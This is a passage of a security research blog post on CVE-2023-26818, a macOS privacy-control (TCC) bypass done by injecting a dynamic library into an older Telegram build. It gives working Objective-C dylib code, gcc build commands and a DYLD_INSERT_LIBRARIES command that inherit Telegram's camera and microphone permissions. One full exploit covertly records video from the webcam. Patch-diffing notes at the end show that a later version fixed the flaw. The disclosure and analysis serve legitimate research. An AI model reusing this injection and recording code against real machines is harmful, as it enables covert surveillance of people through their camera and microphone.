+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo opensnoop -n Telegram -a
+</code></pre></div></div>
+
+<p>Here we defined the process to trace by name using <code class="language-plaintext highlighter-rouge">-n</code> and <code class="language-plaintext highlighter-rouge">-a</code> is used to print all data.</p>
+
+<p><img src="/assets/images/0532cea56e02d3436f20a1099d9c5d79" alt="" /></p>
+
+<p>Here we can see clearly the loaded files by <code class="language-plaintext highlighter-rouge">Telegram</code> app which includes our library (Highlighted in the screenshot) including</p>
+
+<p>library path and other information as the following:</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">ZONE</code>: Zone name.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">UID</code>: User ID.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">PID</code>: Process ID.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">PPID</code>: Parent Process ID.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">FD</code>: File Descriptor (-1 is error).</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">ERR</code>: errno value (see /usr/include/sys/errno.h).</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">CWD</code>: current working directory of the process.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">PATH</code>: pathname for file open.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">COMM</code>: command name for the process.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">ARGS</code>: argument listing for the process.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">TIME</code>: timestamp for the open event, us.</p>
+
+<p>- <code class="language-plaintext highlighter-rouge">STRTIME</code>: timestamp for the open event, string.</p>
+
+<p>Now, How that could be exploited or what impact could that cause? Basically, We are going to bypass <code class="language-plaintext highlighter-rouge">TCC</code> and get access to the</p>
+
+<p>same <code class="language-plaintext highlighter-rouge">Entitlements</code> as <code class="language-plaintext highlighter-rouge">Telegram</code> app, Since our code is loaded within the app then we will act based on <code class="language-plaintext highlighter-rouge">Telegram</code> permissions</p>
+
+<p>and has access to the same things as the following:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">com.apple.security.device.audio-input</code>: This key grants the application access to audio input devices, such as the</p>
+  </li>
+  <li>
+    <p>microphone. Setting this value to true allows the application to access the audio input device (<code class="language-plaintext highlighter-rouge">microphone</code>). which enables</p>
+  </li>
+  <li>
+    <p>the application to record audio.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">com.apple.security.device.camera</code>: This key grants the application access to the camera. Setting this value to true allows</p>
+  </li>
+  <li>
+    <p>the application to access the device’s camera. which enables the application to capture images or record video using the camera.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">com.apple.security.personal-information.location</code>: This key grants the application access to the user’s location information.</p>
+  </li>
+  <li>
+    <p>Setting this value to true allows the application to access the user’s location information. It enables the application to</p>
+  </li>
+  <li>
+    <p>retrieve the device’s current location using GPS or other location services.</p>
+  </li>
+</ul>
+
+<p>And the same goes for the other <code class="language-plaintext highlighter-rouge">Entitlements</code>. Now it’s the time to start exploiting this and showcase for each one of</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Entitlement</code>. Before we start we will need to use the <code class="language-plaintext highlighter-rouge">launch agent</code> to bypass the restrictions. But fIRST Let’s see what</p>
+
+<p>will happen if we Injected the following <code class="language-plaintext highlighter-rouge">DyLib</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+@interface CameraAccessChecker : NSObject
+
++ (BOOL)hasCameraAccess;
+
+@end
+
+@implementation CameraAccessChecker
+
++ (BOOL)hasCameraAccess {
+    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+    if (status == AVAuthorizationStatusAuthorized) {
+        NSLog(@"[+] Access to camera granted.");
+        return YES;
+    } else {
+        NSLog(@"[-] Access to camera denied.");
+        return NO;
+    }
+}
+
+@end
+
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+    [CameraAccessChecker hasCameraAccess];
+}
+</code></pre></div></div>
+
+<p>So, This <code class="language-plaintext highlighter-rouge">DyLib</code> will check if we have access to the camera or not. Let’s explain the code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt; 
+#import &lt;AVFoundation/AVFoundation.h&gt;
+</code></pre></div></div>
+
+<p>Here we imported the required frameworks. <code class="language-plaintext highlighter-rouge">Foundation</code> provides fundamental classes and data types, while <code class="language-plaintext highlighter-rouge">AVFoundation</code> providing</p>
+
+<p>classes for working with audio and video.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@interface CameraAccessChecker : NSObject
+
++ (BOOL)hasCameraAccess;
+
+@end
+</code></pre></div></div>
+
+<p>In this part, we defined the interface of the <code class="language-plaintext highlighter-rouge">CameraAccessChecker</code> class which is a subclass of <code class="language-plaintext highlighter-rouge">NSObject</code> and the interface</p>
+
+<p>contains a single class method <code class="language-plaintext highlighter-rouge">+ (BOOL)hasCameraAccess;</code>. Then, marks the end of the class interface.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@implementation CameraAccessChecker
+
++ (BOOL)hasCameraAccess {
+    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+    if (status == AVAuthorizationStatusAuthorized) {
+        NSLog(@"[+] Access to camera granted.");
+        return YES;
+    } else {
+        NSLog(@"[-] Access to camera denied.");
+        return NO;
+    }
+}
+
+@end
+</code></pre></div></div>
+
+<p>Here we start the implementation of the <code class="language-plaintext highlighter-rouge">CameraAccessChecker</code> class. Then, define the class method <code class="language-plaintext highlighter-rouge">hasCameraAccess</code> which returns</p>
+
+<p>a boolean value (<code class="language-plaintext highlighter-rouge">BOOL</code>) indicating whether the app has access to the camera or not. After that,</p>
+
+<p><code class="language-plaintext highlighter-rouge">AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];:</code> it retrieves the current</p>
+
+<p>authorization status for accessing the camera using the <code class="language-plaintext highlighter-rouge">AVCaptureDevice</code> class. Following the</p>
+
+<p>method <code class="language-plaintext highlighter-rouge">authorizationStatusForMediaType</code> is used to check the authorization status for a specific media type, which in this case</p>
+
+<p>is video (<code class="language-plaintext highlighter-rouge">AVMediaTypeVideo</code>). Then, It checks if the authorization status is <code class="language-plaintext highlighter-rouge">AVAuthorizationStatusAuthorized</code> which means the app</p>
+
+<p>has been granted access to the camera. If it has access then it will print <code class="language-plaintext highlighter-rouge">[+] Access to camera granted.</code> if not then it will</p>
+
+<p>print <code class="language-plaintext highlighter-rouge">[-] Access to camera denied.</code>. Now, It’s the time to compile our <code class="language-plaintext highlighter-rouge">DyLib</code> and try it out:</p>
+
+<p><img src="/assets/images/6658090d579df0fa18d99008070510b5" alt="" /></p>
+
+<p>Here we saved our code in <code class="language-plaintext highlighter-rouge">CamTest.m</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
+</code></pre></div></div>
+
+<p><img src="/assets/images/5e6a1be0f009d992b76d7e0cfbde8a36" alt="" /></p>
+
+<p>Our <code class="language-plaintext highlighter-rouge">DyLib</code> is ready, Let’s Inject it into <code class="language-plaintext highlighter-rouge">Telegram</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DYLD_INSERT_LIBRARIES=CamTest.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
+</code></pre></div></div>
+
+<p><img src="/assets/images/8d2b331a77b17818b736369b967cf3b3" alt="" /></p>
+
+<p>As we can see we can access the camera as Telegram has access to it. The same goes for the microphone:</p>
+
+<p>Microphone code:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+@interface MicrophoneAccessChecker : NSObject
+
++ (BOOL)hasMicrophoneAccess;
+
+@end
+
+@implementation MicrophoneAccessChecker
+
++ (BOOL)hasMicrophoneAccess {
+    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
+    if (status == AVAuthorizationStatusAuthorized) {
+        NSLog(@"[+] Access to microphone granted.");
+        return YES;
+    } else {
+        NSLog(@"[-] Access to microphone denied.");
+        return NO;
+    }
+}
+
+@end
+
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+    [MicrophoneAccessChecker hasMicrophoneAccess];
+}
+</code></pre></div></div>
+
+<p>Microphone Compile:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microphone Test:
+
+
+![](/assets/images/89b0b7f7ecbe1f8c26b1c297e38457dd)
+
+&amp;nbsp;
+</code></pre></div></div>
+
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+
+<p>Now, It’s the time for exploitation. The following code will let us access the camera and record a video for 3 seconds:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+@interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;
+
+@property (strong, nonatomic) AVCaptureSession *captureSession;
+@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
+@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
+
+- (void)startRecording;
+- (void)stopRecording;
+
+@end
+
+@implementation VideoRecorder
+
+- (instancetype)init {
+    self = [super init];
+    if (self) {
+        [self setupCaptureSession];
+    }
+    return self;
+}
+
+- (void)setupCaptureSession {
+    self.captureSession = [[AVCaptureSession alloc] init];
+    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+
+    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
+    NSError *error;
+    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];
+
+    if (error) {
+        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
+        return;
+    }
+
+    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
+        [self.captureSession addInput:self.videoDeviceInput];
+    }
+
+    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+
+    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
+        [self.captureSession addOutput:self.movieFileOutput];
+    }
+}
+
+- (void)startRecording {
+    [self.captureSession startRunning];
+    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.mov"];
+    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+    NSLog(@"Recording started");
+}
+
+- (void)stopRecording {
+    [self.movieFileOutput stopRecording];
+    [self.captureSession stopRunning];
+    NSLog(@"Recording stopped");
+}
+
+#pragma mark - AVCaptureFileOutputRecordingDelegate
+
+- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
+      fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections
+                error:(NSError *)error {
+    if (error) {
+        NSLog(@"Recording failed: %@", [error localizedDescription]);
+    } else {
+        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+    }
+}
+
+@end
+
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
+
+    [videoRecorder startRecording];
+    [NSThread sleepForTimeInterval:3.0];
+    [videoRecorder stopRecording];
+
+    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+}
+</code></pre></div></div>
+
+<p>Let’s explain the code by part by part:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Foundation</code> framework provides basic classes and data types, while <code class="language-plaintext highlighter-rouge">AVFoundation</code> providing classes for working with audio</p>
+
+<p>and video.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;
+
+@property (strong, nonatomic) AVCaptureSession *captureSession;
+@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
+@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
+
+- (void)startRecording;
+- (void)stopRecording;
+
+@end
+</code></pre></div></div>
+
+<p>This interface declares a class called <code class="language-plaintext highlighter-rouge">VideoRecorder</code> that conforms to the <code class="language-plaintext highlighter-rouge">AVCaptureFileOutputRecordingDelegate</code> protocol. It</p>
+
+<p>defines properties for the <code class="language-plaintext highlighter-rouge">AVCaptureSession</code> (used to coordinate video capture), <code class="language-plaintext highlighter-rouge">AVCaptureDeviceInput</code> (used to represent the</p>
+
+<p>device’s camera as an input source), and <code class="language-plaintext highlighter-rouge">AVCaptureMovieFileOutput</code> (used to write the captured video to a file).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@implementation VideoRecorder
+
+- (instancetype)init {
+    self = [super init];
+    if (self) {
+        [self setupCaptureSession];
+    }
+    return self;
+}
+</code></pre></div></div>
+
+<p>Here is the initializer for the <code class="language-plaintext highlighter-rouge">VideoRecorder</code> class. When an instance <code class="language-plaintext highlighter-rouge">VideoRecorder</code> is created, it automatically calls</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">setupCaptureSession</code> method to set up the video capture session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- (void)setupCaptureSession {
+    self.captureSession = [[AVCaptureSession alloc] init];
+    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+
+    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
+    NSError *error;
+    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];
+
+    if (error) {
+        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
+        return;
+    }
+
+    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
+        [self.captureSession addInput:self.videoDeviceInput];
+    }
+
+    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+
+    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
+        [self.captureSession addOutput:self.movieFileOutput];
+    }
+}
+</code></pre></div></div>
+
+<p>In this method, we set up <code class="language-plaintext highlighter-rouge">AVCaptureSession</code> and configures it to use the device’s default video capture device (camera). It</p>
+
+<p>checks for errors during device input configuration and adds the video device input and movie file output to the capture</p>
+
+<p>session if possible.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- (void)startRecording {
+    [self.captureSession startRunning];
+    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.mov"];
+    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+    NSLog(@"Recording started");
+}
+
+- (void)stopRecording {
+    [self.movieFileOutput stopRecording];
+    [self.captureSession stopRunning];
+    NSLog(@"Recording stopped");
+}
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">startRecording</code> method starts <code class="language-plaintext highlighter-rouge">AVCaptureSession</code> and begins recording video to a file with the specified output file URL.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">stopRecording</code> the method stops the recording and the <code class="language-plaintext highlighter-rouge">AVCaptureSession</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma mark - AVCaptureFileOutputRecordingDelegate
+
+- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
+      fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections
+                error:(NSError *)error {
+    if (error) {
+        NSLog(@"Recording failed: %@", [error localizedDescription]);
+    } else {
+        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+    }
+}
+</code></pre></div></div>
+
+<p>This delegate method is called when the recording is finished. It checks for any error and logs the result accordingly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
+
+    [videoRecorder startRecording];
+    [NSThread sleepForTimeInterval:3.0];
+    [videoRecorder stopRecording];
+
+    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+}
+</code></pre></div></div>
+
+<p>Finally, This function is marked with the <code class="language-plaintext highlighter-rouge">__attribute__((constructor))</code> attribute which makes it a constructor function. It is</p>
+
+<p>automatically called before the main function of the program starts running and inside it a new instance of</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">VideoRecorder</code> class is created and then video recording is started and stopped with a 3 seconds delay between</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">start</code> and <code class="language-plaintext highlighter-rouge">stop</code> calls. Now, Let’s Save our code into a file and name it <code class="language-plaintext highlighter-rouge">Camexploit.m</code>:</p>
+
+<p><img src="/assets/images/41a17e927a92d9739a3a90aa46b2ec64" alt="" /></p>
+
+<p>Compiling and testing time:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -dynamiclib -framework Foundation -framework AVFoundation Camexploit.m -o Cam.dylib
+</code></pre></div></div>
+
+<p><img src="/assets/images/ad0a1dc46368b82e747a4c312e84af82" alt="" /></p>
+
+<p>Here we can see it recorded successfully and saved into <code class="language-plaintext highlighter-rouge">/var/folders/vd/0qrj318n3jz1b78pwxcyxjjm0000gn/T/recording.mov</code>. The <code class="language-plaintext highlighter-rouge">Mac</code> I</p>
+
+<p>am using is <code class="language-plaintext highlighter-rouge">Mac-Mini M2 CHIP</code>. In other versions of <code class="language-plaintext highlighter-rouge">telegram</code> it may output that the terminal wants to access the camera.</p>
+
+<p>Because of sandbox restrictions. In this case, we are going to use <code class="language-plaintext highlighter-rouge">Launch Agent</code> it to bypass it. In the next part.</p>
+
+<h1 id="patch-diffing"><strong>Patch Diffing</strong></h1>
+
+<p><img src="/assets/images/52a7650a13c2177febe1867ab813bd0a" alt="" /></p>
+
+<p>Here is the patch diffing between the version we worked on and the last version. Is that we can easily see that in</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Entitlements</code> the team removed <code class="language-plaintext highlighter-rouge">com.apple.security.cs.disable-library-validation</code>, So the app check the signature of the</p>
+
+<p>library before loading it. and added new <code class="language-plaintext highlighter-rouge">Entitlements</code> for read/write and others (Like enabling sandboxing). Finally, The app</p>
+
+<p>the last version is Hardened Runtime so the app will prevent the <code class="language-plaintext highlighter-rouge">DyLib</code> Injection as we can see in the following screenshot:</p>
+
+<p><img src="/assets/images/f1ad659f8654e8e6b3b84573e2e9e5e3" alt="" /></p>
+
+<h1 id="conclusion"><strong>Conclusion</strong></h1>
+
+<p>In this analysis, We understood a lot of terms and technology that are used with-in <code class="language-plaintext highlighter-rouge">MacOS</code> such as</p>
+
+<p><code class="language-plaintext highlighter-rouge">Code Signing</code>, <code class="language-plaintext highlighter-rouge">Entitlements</code>, <code class="language-plaintext highlighter-rouge">Hardend Runtime</code> and many more. We detailed the vulnerability, Why does it happen, How</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">DyLib</code> The injection works &amp; The cases that the app can be vulnerable to it. Finally, We show how an attacker can use this</p>
+
+<p>vulnerability to bypass <code class="language-plaintext highlighter-rouge">TCC</code> and Record a video and It can be exploited with anything <code class="language-plaintext highlighter-rouge">Telegram</code> has access to.</p>
+
+<h2 id="resources"><strong>Resources</strong></h2>
+
+<ul>
+  <li>
+    <p><a href="https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1">https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1</a></p>
+  </li>
+  <li>
+    <p><a href="https://developer.apple.com/documentation/security/hardened_runtime">https://developer.apple.com/documentation/security/hardened_runtime</a></p>
+  </li>
+  <li>
+    <p><a href="https://developer.apple.com/documentation/security/code_signing_services">https://developer.apple.com/documentation/security/code_signing_services</a></p>
+  </li>
+  <li>
+    <p><a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_location_push">https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_location_push</a></p>
+  </li>
+  <li>
+    <p><a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_authentication-services_autofill-credential-provider">https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_authentication-services_autofill-credential-provider</a></p>
+  </li>
+  <li>
+    <p>https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/AboutEntitlements.html</p>
+  </li>
+  <li>
+    <p>https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html</p>
+  </li>
+  <li>
+    <p>https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/</p>
+  </li>
+  <li>
+    <p>https://ofiralmkias.medium.com/bypassing-macos-sandbox-performing-privilege-escalation-and-more-2a020efd7ceb</p>
+  </li>
+  <li>
+    <p>https://support.apple.com/en-my/guide/terminal/apdc6c1077b-5d5d-4d35-9c19-60f2397b2369/mac</p>
+  </li>
+  <li>
+    <p>https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/</p>
+  </li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#macos" class="page__taxonomy-item" rel="tag">MacOS</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-08-01T00:00:00+08:00">August 1, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/security%20research/CVE_2021_38294/" class="pagination--pager" title="CVE-2021-38294: Apache Storm Nimbus Command Injection
+">Previous</a>
+    
+    
+      <a href="/macos/CVE_2023_26818_P2/" class="pagination--pager" title="CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
